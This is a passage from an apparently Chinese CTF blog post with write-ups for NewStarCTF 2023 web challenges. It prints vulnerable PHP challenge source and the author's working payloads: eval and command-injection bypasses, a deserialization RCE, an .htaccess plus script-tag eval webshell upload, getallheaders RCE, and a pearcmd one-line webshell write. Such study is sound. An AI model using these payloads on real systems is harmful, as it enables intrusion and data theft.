class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;  <span class="comment">//弱比较，直接md5为0绕过</span></span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;  <span class="comment">//数组绕过</span></span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;  <span class="comment">//数组绕过</span></span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;  <span class="comment">//添加非数字字符绕过</span></span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);<span class="comment">//提取关联数组</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;<span class="comment">//过滤数字与字符，用无字符符号绕过</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>前面几步很简单，最后传入关联数组后，需要flag5为真，且flag5为无字符变量，直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag5=(~%8F%97%8F%96%91%99%90)();  //相当于语句phpinfo();</span><br></pre></td></tr></table></figure><p>flag{0e742ffa-dc49-41d5-bdaa-f2c91e598fab}</p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;  <span class="comment">//md5碰撞 解得password=114514</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;<span class="comment">//过滤这几个命令</span></span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>过滤的命令用&#x2F;\双写都没办法绕过，换用tac(从最后一排开始输出)可以避免用这几个命令，payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=114514&amp;e[v.a.l=echo `tac /fl*`;  //_在post请求中非法，用[代替，用反引号避免无法解析</span><br></pre></td></tr></table></figure><p>flag{afa8401e-9ce8-43da-96d2-5719aae6fc40}</p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>直接密码爆破，admin 000000，抓包可以看到flag</p><p><img src="/2023/10/02/NewStarCTF2023-web/7-1.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>知道了tac命令以及在post传值时，_是不合法的</p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p>查看js，发现关键代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//游戏结束</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gameover</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(gameScore &gt; <span class="number">100000</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        xhr.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;/api.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> response = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">            <span class="title function_">alert</span>(response.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;</span><br><span class="line">            <span class="attr">score</span>: gameScore,</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;成绩：&quot;</span>+gameScore);</span><br><span class="line">gameScore=<span class="number">0</span>;  </span><br><span class="line">curPhase =<span class="variable constant_">PHASE_READY</span>;  </span><br><span class="line">hero = <span class="literal">null</span>;</span><br><span class="line">hero = <span class="keyword">new</span> <span class="title class_">Hero</span>();      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计代码，只要以json方式在api.php页面上传的score大于100000，就会返回flag，直接上传即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://aba9532b-cca9-44fe-ae0b-f9635e6e6247.node4.buuoj.cn:81/api.php&quot;</span></span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;score&#x27;</span>:<span class="number">111111</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response=requests.post(url=url,json=data).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure><h3 id="include0。0"><a href="#include0。0" class="headerlink" title="include0。0"></a>include0。0</h3><p>文件包含</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>过滤了<code>base rot</code>，可以选择使用其他过滤器，格式：<code>php://filter/convert.iconv.*/resource=flag.php</code>,过滤器使用方法：</p><p><code>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 或者 convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;``这里的&lt;input-encoding&gt;和&lt;output-encoding&gt;分别为输入的字符串编码方式和输出的字符串编码方式（字符集）。</code>，所以我们可以先定下输入编码方式，爆破输出编码方式。payload:</p><p><code>php://filter/convert.iconv.UTF-8.爆破位置/resource=flag.php</code></p><p><img src="/2023/10/02/NewStarCTF2023-web/w2.2-1.png"></p><h3 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h3><p>插入万能密码，提示no，说明有waf，试了一下是大小写绕过，直接用sqlmap的randomcase.py模块一把梭。</p><p><img src="/2023/10/02/NewStarCTF2023-web/w2.3-1.png"></p><h3 id="Unserialize"><a href="#Unserialize" class="headerlink" title="Unserialize?"></a>Unserialize?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>很简单的反序列化，只要cmd执行即可，唯一需要注意的是，需要将私有属性改为公有，这样对象才能执行任意命令，exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">`<span class="meta">&lt;?php</span>`</span><br><span class="line"></span><br><span class="line">`<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);`</span><br><span class="line"></span><br><span class="line">`<span class="comment">// Maybe you need learn some knowledge about deserialize?`</span></span><br><span class="line"></span><br><span class="line">`<span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;`</span><br><span class="line"></span><br><span class="line">  `<span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;ls /;uniq /th1s_1s_fffflllll4444aaaggggg&quot;</span>;`</span><br><span class="line"></span><br><span class="line">`&#125;`</span><br><span class="line"></span><br><span class="line">`<span class="variable">$a</span>=<span class="keyword">new</span> evil;`</span><br><span class="line"></span><br><span class="line">`<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);`</span><br><span class="line"></span><br><span class="line">`<span class="meta">?&gt;</span>` </span><br></pre></td></tr></table></figure><p>payload:<code>O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:40:&quot;ls /;uniq /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</code></p><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>文件上传，经过反复测试，后端对php解析的所有后缀都过滤了，绕过方法：上传<code>.htaccess</code>配置文件，修改配置使得所有文件都可以解析：<code>SetHandler application/x-httpd-php</code></p><p>并且会检测文件内容中是否存在<code>&lt;?php或&lt;?</code>标签，存在也会上传失败，绕过方法，使用html中的<code>script</code>标签执行<code>eval</code>函数：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将文件令为html文件，上传访问解析即可，然后进入后门。</p><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>提示什么都没有，看看leaked，是<code>.git</code>泄露，用工具发现<code>bo0g1pop.php</code>，访问：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>if (&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;star&#39;]))</code>将除字母、下划线、括号外的所有字符都删除，那么这里就是无字符参数rce，需要用函数进行构造，由于将scandir过滤了，所以无法直接访问到目录，这里可以用<code>getallheaders()</code>函数进行rce，由于这个函数会匹配所有header，我们只需要我们插入的那项，这时候会用到这两个函数：</p><p><code>array_flip()</code>是交换数组的键和值，<code>array_rand()</code>是随机返回一个数组，使用<code>array_rand(array_flip())</code>就有可能匹配到我们的rce命令，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//header</span><br><span class="line">Leon: ls /;cat /flag;</span><br><span class="line">//GET</span><br><span class="line">?star=system(array_rand(array_flip(getallheaders())));</span><br></pre></td></tr></table></figure><p>由于是随机匹配，所以需要多进行几次刷新，就可以拿到flag。</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/157431794">https://zhuanlan.zhihu.com/p/157431794</a></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="include🍐"><a href="#include🍐" class="headerlink" title="include🍐"></a>include🍐</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>提示在phpinfo.php，访问给到提示<code>register_argc_argv</code>是开启状态，了解<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/">register_argc_argv与rce</a>,还有需要注意的是，利用的漏洞文件<code>pearcmd.php</code>路径是在<code>/usr/local/lib/php/pearcmd.php</code>，构造payload:<code>?file=/usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;+2.php</code>,由于文件包含时加了.php，所以这里的pearcmd不加，在pear命令中，分隔符为+而不是&amp;，所以payload意思为：包含这个文件，这时执行pear命令，创建2.php文件并向文件内写入一句话木马（注意这个文件我们没用指定上传路径，所以默认就是在网页目录），访问这个文件，发现文件被解析，直接可以进入后门。</p><h3 id="popGadget"><a href="#popGadget" class="headerlink" title="popGadget"></a>popGadget</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span 